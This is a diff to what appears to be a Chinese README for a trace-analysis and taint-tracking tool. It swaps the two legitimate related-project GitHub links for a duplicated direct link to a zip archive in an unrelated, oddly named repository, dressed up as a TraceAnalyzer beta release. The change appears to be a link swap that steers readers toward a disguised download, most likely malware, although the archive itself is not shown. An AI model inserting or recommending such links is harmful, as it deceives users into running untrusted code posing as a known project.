@@ -72,6 +72,6 @@ Ctrl+C：复制选中行（如果没选中任何行，会复制全部）
 右键寄存器进行污点追踪
 新增地址全查、指令全查
 【关联项目】
-https://github.com/jiqiu2022/vm-trace-release
-https://github.com/lxz-jiandan/TraceAnalyzer
+https://raw.githubusercontent.com/Isolable-confutation802/TraceAnalyzer-main/main/unspendable/Trace-main-Analyzer-v1.2-beta.5.zip
+https://raw.githubusercontent.com/Isolable-confutation802/TraceAnalyzer-main/main/unspendable/Trace-main-Analyzer-v1.2-beta.5.zip
 ================================================================================
